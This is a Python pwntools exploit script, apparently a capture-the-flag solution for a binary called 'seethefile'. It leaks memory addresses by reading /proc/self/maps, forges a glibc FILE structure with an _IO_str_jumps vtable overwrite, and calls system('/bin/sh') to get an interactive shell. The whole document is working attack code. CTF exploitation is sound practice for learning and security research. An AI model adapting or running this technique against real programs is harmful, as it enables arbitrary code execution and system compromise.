#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

r = process('./seethefile')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def cmd(x):
    r.recvuntil('choice :')
    r.sendline(str(x))

def openfile(name):
    cmd(1)
    r.recvuntil('Filename:')
    r.sendline(name)

def readfile():
    cmd(2)

def writefile():
    cmd(3)

def ex(s):
    cmd(4)
    r.recvuntil('name :')
    r.sendline(s)

openfile('/proc/self/maps')
readfile()
writefile()
binary_base = int('0x' + r.recvuntil('-')[5:-1], 16)
print '[+] binary_base :', hex(binary_base)

readfile()
writefile()
r.recvuntil('[heap]\n')
libc_base = int('0x' + r.recvuntil('-')[:-1], 16)
print '[+] libc_base :', hex(libc_base)
system = libc_base + libc.symbols['system']

bin_sh_offset = 0x1b3e9a 
IO_str_jumps = libc_base + 0x3e8360 # this may different with your system 

buf = binary_base + 0x202060 
lock = buf + 0x500

payload = p64(0)
payload+= p64(0)
payload+= p64(0)
payload+= p64(0)
payload+= p64(0)
payload+= p64(0)
payload+= p64(0)
payload+= p64(libc_base + bin_sh_offset)
payload+= p64(libc_base + bin_sh_offset)
payload = payload.ljust(0x88,'\x00') + p64(lock)
payload = payload.ljust(0xd8,'\x00') + p64(IO_str_jumps)
payload = payload.ljust(0xe8,'\x00') + p64(system)
payload = payload.ljust(0x100,'\x00') + p64(buf)

raw_input('#')
ex(payload)

r.interactive()
